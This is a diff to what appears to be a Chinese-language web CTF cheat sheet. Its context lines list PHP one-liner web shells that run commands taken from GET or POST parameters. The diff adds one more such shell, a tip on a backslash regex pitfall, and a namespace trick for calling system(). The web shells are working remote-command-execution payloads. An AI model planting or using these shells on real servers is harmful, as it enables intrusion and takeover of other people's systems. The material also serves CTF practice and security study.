@@ -61,6 +61,7 @@ Table of Contents
 <?php system($_GET[1]); ?>
 <?php system("`$_GET[1]`"); ?>
 <?= system($_GET[cmd]);
+<?=`$_GET[1]`;
 <?php eval($_POST[cmd]);?>
 <?php echo `$_GET[1]`;
 <?php echo passthru($_GET['cmd']);
@@ -541,6 +542,9 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - ```echo `whoami`; ```
     - `kaibro`
 - 正規表達式`.`不匹配換行字元`%0a`
+- 正規表達式常見誤用:
+    - `preg_match("/\\/", $str)`
+    - 匹配反斜線應該要用`\\\\`而不是`\\`
 - 運算優先權問題
     - `$a = true && false;`
         - `$a` => `false`
@@ -594,7 +598,9 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - openssl_verify
     - 預測採用SHA1來做簽名，可能有SHA1 Collision問題
     - DEFCON CTF 2018 Qual
-
+- Namespace
+    - PHP的預設Global space是`\`
+    - e.g. `\system('ls');`
 
 # Command Injection
 
